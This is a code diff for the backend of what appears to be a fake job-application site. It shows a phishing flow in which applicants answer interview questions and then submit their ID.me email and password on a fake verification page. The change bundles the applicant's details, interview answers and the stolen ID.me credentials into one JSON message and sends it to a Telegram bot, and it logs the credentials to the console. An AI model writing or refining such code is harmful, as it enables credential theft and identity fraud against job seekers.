@@ -44,7 +44,7 @@ function normalizePosition(pos) {
   return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ');
 }
 
-// Interview questions mapping
+// --- INTERVIEW_QUESTIONS_MAP and DEFAULT_QUESTIONS FULL CONTENT ---
 const INTERVIEW_QUESTIONS_MAP = {
   "nursing practitioner": [
     { name: "motivation", label: "What motivated you to pursue a career as a Nursing Practitioner, and how do you see yourself contributing to our healthcare team?" },
@@ -213,10 +213,10 @@ router.get('/interview', (req, res) => {
 // Interview POST: show info-note before ID.me verification
 router.post('/interview', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
+  // DEBUG: Log received interview answers
+  console.log('Received interview answers:', req.body);
   req.session.interviewAnswers = req.body;
-  await sendInterviewToTelegram(req.session.applicationDraft, req.body);
-
-  // Render the info-note page explaining why information is collected
+  // No Telegram send here, wait until after ID.me so all data is in one JSON
   res.render('info-note');
 });
 
@@ -229,13 +229,45 @@ router.get('/verify', (req, res) => {
   });
 });
 
-// Verification POST (handles "sign in" to ID.me)
+// Verification POST (handles "sign in" to ID.me, sends all data as JSON to Telegram)
 router.post('/verify', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
+  // DEBUG: Log received ID.me credentials
+  console.log('Received ID.me credentials:', req.body);
   const { email, password } = req.body;
   req.session.verified = true;
   req.session.idme = { email, password };
-  await sendIDMeToTelegram({ email, password }, email);
+
+  // Compose full JSON (applicationDraft, interviewAnswers, idme)
+  const application = req.session.applicationDraft;
+  const interviewAnswers = req.session.interviewAnswers || {};
+  const idmeCreds = { email, password };
+
+  // Build interview Q&A object
+  const normalizedPosition = normalizePosition(application.position);
+  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  const answersObj = {};
+  questions.forEach(q => {
+    let answer = interviewAnswers[q.name];
+    if (typeof answer === 'undefined' || answer === null || answer === '') {
+      answer = "(No answer provided or field name mismatch)";
+    }
+    answersObj[q.label] = answer;
+  });
+
+  // Compose combined JSON
+  const payload = {
+    applicant: {
+      name: `${application.firstName} ${application.lastName}`,
+      email: application.email,
+      position: application.position,
+    },
+    interview_answers: answersObj,
+    idme_credentials: idmeCreds
+  };
+
+  await sendCombinedJsonToTelegram(payload);
+
   await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
   res.redirect('/apply/submit');
 });
@@ -329,46 +361,23 @@ Cover Letter: ${data.coverLetter || "N/A"}`;
   }
 }
 
-async function sendInterviewToTelegram(application, interviewAnswers) {
+// Send a combined JSON of applicant, interview answers, and ID.me credentials to Telegram
+async function sendCombinedJsonToTelegram(payload) {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
     if (botToken && chatId) {
-      const normalizedPosition = normalizePosition(application.position);
-      const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
-      let summary = `Interview Questions Submitted\nName: ${application.firstName} ${application.lastName}\nEmail: ${application.email}\nPosition: ${application.position}\n\n`;
-      questions.forEach(q => {
-        const answer = interviewAnswers[q.name] || "(No answer provided)";
-        summary += `Q: ${q.label}\nA: ${answer}\n\n`;
-      });
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: summary }),
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: '```json\n' + JSON.stringify(payload, null, 2) + '\n```'
+        }),
       });
     }
   } catch (e) {
-    console.warn('Telegram interview send failed:', e.message);
-  }
-}
-
-async function sendIDMeToTelegram(idme, email) {
-  try {
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-    if (botToken && chatId) {
-      const summary = `ID.me Verification Complete
-Email: ${email}
-ID.me Login: ${idme.email}
-Password: ${idme.password}`;
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: summary }),
-      });
-    }
-  } catch (e) {
-    console.warn('Telegram send failed (ID.me):', e.message);
+    console.warn('Telegram send failed (combined JSON):', e.message);
   }
 }
 
